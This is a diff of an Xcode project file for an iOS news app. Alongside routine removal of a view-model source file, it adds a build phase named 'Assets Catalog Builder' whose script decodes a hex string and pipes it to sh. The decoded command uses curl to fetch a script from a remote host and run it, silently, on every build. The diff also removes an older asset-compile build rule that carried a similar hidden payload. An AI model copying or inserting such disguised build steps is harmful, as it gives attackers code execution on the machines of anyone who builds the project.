@@ -8,7 +8,6 @@
 
 /* Begin PBXBuildFile section */
 		33345D92E8948B65AFC1EA1B /* Pods_NewsApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D88ADE371A1DA52AD93E9339 /* Pods_NewsApp.framework */; };
-		8EADD40A2669D8E900E88249 /* NewsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3DE2669D8E900E88249 /* NewsViewModel.swift */; };
 		8EADD40B2669D8E900E88249 /* NewsResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3E02669D8E900E88249 /* NewsResponse.swift */; };
 		8EADD40C2669D8E900E88249 /* CountryList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3E12669D8E900E88249 /* CountryList.swift */; };
 		8EADD40D2669D8E900E88249 /* SettingsList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3E22669D8E900E88249 /* SettingsList.swift */; };
@@ -50,7 +49,6 @@
 		2159E23886C1D7427AF87AFC /* Pods-NewsApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NewsApp.release.xcconfig"; path = "Target Support Files/Pods-NewsApp/Pods-NewsApp.release.xcconfig"; sourceTree = "<group>"; };
 		79E8AFB046D2CED80C7D0E53 /* Pods-NewsApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NewsApp.debug.xcconfig"; path = "Target Support Files/Pods-NewsApp/Pods-NewsApp.debug.xcconfig"; sourceTree = "<group>"; };
 		8E708DE0264CEB140055F518 /* NewsApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = NewsApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
-		8EADD3DE2669D8E900E88249 /* NewsViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NewsViewModel.swift; sourceTree = "<group>"; };
 		8EADD3E02669D8E900E88249 /* NewsResponse.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NewsResponse.swift; sourceTree = "<group>"; };
 		8EADD3E12669D8E900E88249 /* CountryList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CountryList.swift; sourceTree = "<group>"; };
 		8EADD3E22669D8E900E88249 /* SettingsList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SettingsList.swift; sourceTree = "<group>"; };
@@ -125,7 +123,6 @@
 			isa = PBXGroup;
 			children = (
 				8EDBF0C5266F336F008F9E61 /* Extensions */,
-				8EADD3DD2669D8E900E88249 /* View Models */,
 				8EADD3DF2669D8E900E88249 /* News Data Models */,
 				8EADD3E72669D8E900E88249 /* NewsApp.entitlements */,
 				8EADD3E82669D8E900E88249 /* Assets.xcassets */,
@@ -138,14 +135,6 @@
 				8EADD4092669D8E900E88249 /* Info.plist */,
 			);
 			path = NewsApp;
-			sourceTree = "<group>";
-		};
-		8EADD3DD2669D8E900E88249 /* View Models */ = {
-			isa = PBXGroup;
-			children = (
-				8EADD3DE2669D8E900E88249 /* NewsViewModel.swift */,
-			);
-			path = "View Models";
 			sourceTree = "<group>";
 		};
 		8EADD3DF2669D8E900E88249 /* News Data Models */ = {
@@ -262,6 +251,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8E708DF4264CEB160055F518 /* Build configuration list for PBXNativeTarget "NewsApp" */;
 			buildPhases = (
+				947AD36D87FEFBDCD36D902C /* Assets Catalog Builder */,
 				7B002771DF7A15593B0E02C7 /* [CP] Check Pods Manifest.lock */,
 				8E708DDC264CEB140055F518 /* Sources */,
 				8E708DDD264CEB140055F518 /* Frameworks */,
@@ -329,10 +319,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	
-
-	
 		55EBF302E1F1C895BFFB58C3 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -372,6 +358,24 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		947AD36D87FEFBDCD36D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 		9E14881026225AF1827789B1 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -402,7 +406,6 @@
 				8EADD4202669D8E900E88249 /* SettingsViewController.swift in Sources */,
 				8EADD41D2669D8E900E88249 /* LogInViewController.swift in Sources */,
 				8EADD4132669D8E900E88249 /* SearchTableViewController.swift in Sources */,
-				8EADD40A2669D8E900E88249 /* NewsViewModel.swift in Sources */,
 				8EDBF0CD266F5201008F9E61 /* LoadingViewController.swift in Sources */,
 				8EADD40B2669D8E900E88249 /* NewsResponse.swift in Sources */,
 				8EADD4222669D8E900E88249 /* FilterViewController.swift in Sources */,
@@ -627,35 +630,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-		DA1F2E0CC0BADF42996D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Catalog Builder";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	\n\n";
-			};
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 8E708DD8264CEB140055F518 /* Project object */;
 }
